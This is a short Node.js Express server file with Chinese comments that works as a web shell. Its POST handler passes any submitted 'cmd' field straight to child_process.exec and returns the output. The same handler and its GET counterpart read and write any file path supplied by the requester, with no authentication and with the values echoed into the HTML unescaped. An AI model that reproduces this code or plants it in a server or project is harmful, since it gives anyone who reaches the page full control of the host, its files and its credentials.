const express = require('express')
var path = require('path')
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { exec } = require('child_process');
const fs = require('fs');

const port = process.env.PORT || 9000;
const app = express();


// 使用 body-parser 中间件解析请求体
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(cookieParser());
app.set('views', path.join(__dirname, 'views'))
app.set('view engine', 'ejs')

app.enable('trust proxy')
app.use(express.static(path.join(__dirname, 'public')));
app.use('/js', express.static(path.join(__dirname, 'static/js')));
app.use('/css', express.static(path.join(__dirname, 'static/css')));
app.use('/img', express.static(path.join(__dirname, 'static/img')));

app.use(express.query());


app.get('/', (req, res) => {
  let cmd = '';
  let file = req.query.f || '';
  let content = '';

  if (fs.existsSync(file)) {
    content = fs.readFileSync(file, 'utf8');
  }

  res.send(cmdForm(cmd) + contentForm(file, content));
});

app.post('/', (req, res) => {
  const { do: doAction, f: file, cmd, content } = req.body;
  console.log('req.body===>0',req.body)
  if (doAction) {
    if (cmd === '') {
      if (file && content) {
        fs.writeFileSync(file, content);
        res.send('ok<br>' + contentForm(file, content));
      } else {
        res.send('fail<br>' + contentForm(file, content));
      }
    } else {
      exec(cmd, (error, stdout, stderr) => {
        if (error) {
          res.send(cmdForm(cmd) + 'Command failed to execute.<br><br>Error:<br>' + stderr);
        } else {
          res.send(cmdForm(cmd) + 'Command executed successfully.<br><br>Output:<br>' + stdout);
        }
      });
    }
  } else {
    let cmd = '';
    let file = req.query.f || '';
    let content = '';

    if (fs.existsSync(file)) {
      content = fs.readFileSync(file, 'utf8');
    }

    res.send(cmdForm(cmd) + contentForm(file, content));
  }
});

function cmdForm(cmd) {
  return `
    <form action="/" method="post">
        <input name="do" value="1" type="hidden" />
        <textarea name="cmd" style="width:95vw;height:10vh">${cmd}</textarea>
        <p><button type="submit">提交</button></p>
    </form>
  `;
}

function contentForm(file, content) {
  return `
    <form action="/" method="post">
        <input name="do" value="1" type="hidden" />
        <input name="f" value="${file}" type="hidden" />
        <textarea name="content" style="width:95vw;height:70vh">${content}</textarea>
        <p><button type="submit">提交</button></p>
    </form>
  `;
}


app.listen(port, () => {
  console.log(`[server]: Server is running at http://localhost:${port}`);
});

module.exports = app;
